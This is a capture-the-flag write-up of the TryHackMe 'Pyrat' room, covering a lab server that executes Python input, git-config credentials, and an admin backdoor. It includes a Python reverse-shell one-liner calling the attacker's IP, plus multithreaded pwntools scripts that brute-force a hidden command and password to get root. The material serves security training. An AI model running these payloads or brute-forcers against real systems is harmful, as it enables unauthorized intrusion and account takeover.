---
title: "TryHackMe: Pyrat"
author: jaxafed
categories: [TryHackMe]
tags: [python, git, brute-force]
render_with_liquid: false
media_subpath: /images/tryhackme_pyrat/
image:
  path: room_image.webp
---

**Pyrat** was a room centered around a **Python** program. Initially, we used the program to execute **Python** code and establish a foothold. Afterward, we discovered user credentials within the configuration file of a local **git** repository and switched to that user. Additionally, by enumerating the **git** repository, we found a code snippet from an older version of the program. With knowledge of this source code snippet, we successfully brute-forced an input and a password, allowing us to use the program to obtain a shell as **root**.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/pyrat){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.98.190
Nmap scan report for 10.10.98.190
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: SimpleHTTP/0.6 Python/3.11
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- **22** (SSH)
- **8000** 

## Shell as www-data

If we make an **HTTP** request to port **8000**, we receive the response: `Try a more basic connection`.

```console
$ curl http://10.10.98.190:8000/
Try a more basic connection
```

Following the message, connecting with `nc` and attempting to run a command, we encounter an error specific to **Python**.

```console
$ nc 10.10.98.190 8000
test
name 'test' is not defined
```

Pursuing this further, we can confirm that we are able to execute **Python** commands.

```console
print(8*8)
64
```

Using this, we can send a **Python** reverse shell payload and obtain a shell as `www-data`.

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.98.190] 38688
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as think

After stabilizing the shell and enumerating the file system, we discover an interesting directory at `/opt`.

```console
www-data@Pyrat:~$ ls -la /opt
total 12
drwxr-xr-x  3 root  root  4096 Jun 21  2023 .
drwxr-xr-x 18 root  root  4096 Dec 22  2023 ..
drwxrwxr-x  3 think think 4096 Jun 21  2023 dev
```

Checking the `/opt/dev` directory, we find a local **git** repository.

```console
www-data@Pyrat:~$ ls -la /opt/dev
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
```

Reading the `/opt/dev/.git/config`, we find the password for the `think` user.

```console
www-data@Pyrat:~$ cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = [REDACTED]
```

We can use this password to switch to the user and read the user flag.

```console
www-data@Pyrat:~$ su - think
Password:
think@Pyrat:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@Pyrat:~$ wc -c user.txt
33 user.txt
```

## Shell as root

Checking the user’s emails, we come across an interesting message mentioning a **RAT** program running on the machine.

```console
think@Pyrat:~$ cat /var/mail/think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```
{: .wrap }

Checking the running processes, `/root/pyrat.py` is likely the program mentioned.

```console
root         596  0.0  0.0   2608   596 ?        Ss   00:00   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         597  0.0  1.4  21864 14592 ?        S    00:00   0:00 python3 /root/pyrat.py
```

Going back to the **git** repository and checking the commits made, we see a single commit.

```console
think@Pyrat:/opt/dev$ git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
```

Checking the changes made in the commit, we find a snippet of code from a presumably older version of the `pyrat.py` program.

```console
think@Pyrat:/opt/dev$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```

Examining the code snippet, it appears that:

- If the client sends an unknown string, it performs some operation with the socket, likely related to the comment about "socket being admin."
- If the client sends the `shell` string, it simply spawns a shell.
- For any other input, it passes the input to **Python**'s `exec` function.

Knowing this, we can write a simple **Python** script to discover the unknown input.

```python
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
stop_flag = threading.Event()
num_threads = 100


def brute_force_input(words):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for word in words:
        if stop_flag.is_set():
            r.close()
            return
        if word == "shell":
            continue
        r.sendline(word.encode())
        output = r.recvline()
        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
                stop_flag.set()
                print(f"[+] Input found: {word}")
                print(f"[+] Output recieved: {output}")
                r.close()
                return
    r.close()
    return


def main():
    words = [line.strip() for line in open(wordlist, "r").readlines()]
    words_length = len(words)
    step = (words_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, words_length)
        if start < words_length:
            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```
{: file="brute_force_input.py" }

Running the script, we discover the unknown input as `admin`.

```console
$ python3 brute_force_input.py
[+] Input found: admin
[+] Output recieved: b'Start a fresh client to begin.\n'
```

Connecting to the server and sending the `admin` input, we see that it now prompts for a password.

```console
$ nc 10.10.98.190 8000
admin
Password:
```

We can modify our previous script to also brute force the password as follows:

```python
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
stop_flag = threading.Event()
num_threads = 100


def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return


def main():
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
```
{: file="brute_force_pass.py"}

By running the script, we successfully discover the password.

```console
$ python3 brute_force_pass.py
[+] Password found: [REDACTED]
```

Now, using the password obtained along with the `admin` input, we can elevate our connection to `admin`.

```console
$ nc 10.10.98.190 8000
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
```

After that, by sending the `shell` input to spawn a shell, we see that we obtain a shell as the `root` user and can read the root flag.

```
shell
# id
id
uid=0(root) gid=0(root) groups=0(root)
# wc -c root.txt
wc -c root.txt
33 root.txt
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>